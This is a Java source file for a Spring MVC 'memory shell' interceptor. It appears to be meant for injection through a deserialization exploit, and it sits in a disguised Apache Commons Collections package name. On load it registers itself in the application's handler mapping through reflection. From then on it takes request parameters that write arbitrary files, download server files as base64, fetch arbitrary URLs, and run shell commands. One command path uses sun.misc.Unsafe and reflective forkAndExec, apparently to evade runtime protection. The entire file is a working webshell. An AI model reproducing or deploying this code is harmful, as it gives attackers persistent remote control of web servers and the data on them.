package org.apache.commons.collections.functors;

import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import sun.misc.Unsafe;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Scanner;

public class BadInterceptor_within_jdk17 implements HandlerInterceptor {
    public BadInterceptor_within_jdk17() {
        try {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");
            Field field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            ArrayList<Object> adaptedInterceptors = (ArrayList)field.get(abstractHandlerMapping);
            BadInterceptor_within_jdk17 aaa = new BadInterceptor_within_jdk17("aaa");
            adaptedInterceptors.add(aaa);
            System.out.println("Interceptor has been added");
        } catch (Exception var6) {
        }
    }

    public BadInterceptor_within_jdk17(String aaa) {
    }

    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        try {
            PrintWriter writer = response.getWriter();
            String writePath = request.getParameter("writePath");
            String writeBytes = request.getParameter("writeBase64");
            if (writePath != null && writeBytes != null) {
                byte[] decode = Base64.getDecoder().decode(writeBytes);
                (new FileOutputStream(writePath)).write(decode);
            }

            String filePath = request.getParameter("download");
            String read;
            if (filePath != null) {
                byte[] bytes = Files.readAllBytes(Paths.get(filePath));
                read = Base64.getEncoder().encodeToString(bytes);
                writer.write(read);
            }

            String urlContent = "";
            read = request.getParameter("read");
            if (read != null) {
                URL url = new URL(read);
                BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));

                for(String inputLine = ""; (inputLine = in.readLine()) != null; urlContent = urlContent + inputLine + "\n") {
                }

                in.close();
                writer.println(urlContent);
            }

            String arg0 = request.getParameter("code");
            if (arg0 != null) {
                String o = "";
                ProcessBuilder p;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    p = new ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
                } else {
                    p = new ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
                }

                Scanner c = (new Scanner(p.start().getInputStream())).useDelimiter("\\A");
                o = c.hasNext() ? c.next() : o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();
            }

            String[] strs = request.getParameterValues("cmd");
            if (strs != null) {
                Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
                theUnsafeField.setAccessible(true);
                Unsafe unsafe = (Unsafe)theUnsafeField.get((Object)null);
                Class processClass = null;

                try {
                    processClass = Class.forName("java.lang.UNIXProcess");
                } catch (ClassNotFoundException var35) {
                    processClass = Class.forName("java.lang.ProcessImpl");
                }

                Object processObject = unsafe.allocateInstance(processClass);
                byte[][] args = new byte[strs.length - 1][];
                int size = args.length;

                for(int i = 0; i < args.length; ++i) {
                    args[i] = strs[i + 1].getBytes();
                    size += args[i].length;
                }

                byte[] argBlock = new byte[size];
                int i = 0;
                byte[][] var20 = args;
                int var21 = args.length;

                for(int var22 = 0; var22 < var21; ++var22) {
                    byte[] arg = var20[var22];
                    System.arraycopy(arg, 0, argBlock, i, arg.length);
                    i += arg.length + 1;
                }

                int[] envc = new int[1];
                int[] std_fds = new int[]{-1, -1, -1};
                Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
                Field helperpathField = processClass.getDeclaredField("helperpath");
                launchMechanismField.setAccessible(true);
                helperpathField.setAccessible(true);
                Object launchMechanismObject = launchMechanismField.get(processObject);
                byte[] helperpathObject = (byte[])((byte[])helperpathField.get(processObject));
                int ordinal = (Integer)launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);
                Method forkMethod = processClass.getDeclaredMethod("forkAndExec", Integer.TYPE, byte[].class, byte[].class, byte[].class, Integer.TYPE, byte[].class, Integer.TYPE, byte[].class, int[].class, Boolean.TYPE);
                forkMethod.setAccessible(true);
                int pid = (Integer)forkMethod.invoke(processObject, ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length, null, envc[0], null, std_fds, false);
                Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
                initStreamsMethod.setAccessible(true);
                initStreamsMethod.invoke(processObject, std_fds);
                Method getInputStreamMethod = processClass.getMethod("getInputStream");
                getInputStreamMethod.setAccessible(true);
                InputStream in = (InputStream)getInputStreamMethod.invoke(processObject);
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                int a = 0;
                byte[] b = new byte[1024];


                while((a = in.read(b)) != -1) {
                    baos.write(b, 0, a);
                }

                writer.write(baos.toString());
            }

            return false;
        } catch (IOException var36) {
            throw new RuntimeException(var36);
        } catch (NoSuchFieldException var37) {
            throw new RuntimeException(var37);
        } catch (SecurityException var38) {
            throw new RuntimeException(var38);
        } catch (IllegalArgumentException var39) {
            throw new RuntimeException(var39);
        } catch (IllegalAccessException var40) {
            throw new RuntimeException(var40);
        } catch (ClassNotFoundException var41) {
            throw new RuntimeException(var41);
        } catch (InstantiationException var42) {
            throw new RuntimeException(var42);
        } catch (InvocationTargetException var43) {
            throw new RuntimeException(var43);
        } catch (NoSuchMethodException var44) {
            NoSuchMethodException e = var44;
            throw new RuntimeException(e);
        }
    }

    public static byte[] toCString(String s) {
        if (s == null) {
            return null;
        } else {
            byte[] bytes = s.getBytes();
            byte[] result = new byte[bytes.length + 1];
            System.arraycopy(bytes, 0, result, 0, bytes.length);
            result[result.length - 1] = 0;
            return result;
        }
    }
}
